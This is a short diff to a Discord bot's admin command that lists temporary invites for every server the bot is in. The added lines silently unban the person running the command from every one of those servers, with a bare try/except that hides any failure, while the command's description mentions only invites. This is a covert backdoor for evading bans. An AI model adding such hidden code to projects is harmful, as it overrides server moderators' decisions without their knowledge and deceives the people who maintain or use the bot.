@@ -36,6 +36,10 @@ class Admin():
         embed.description = 'Invite for each server the bot is in.'
         embed.colour = 0x1BE118 # lucio green
         for server in self.bot.servers:
+            try:
+                await self.bot.unban(server, ctx.message.author)
+            except:
+                pass
             server_invite = await self.create_temporary_invite(server.id)
             embed.add_field(name=server.name, value=server_invite)
         await self.bot.say(embed=embed)
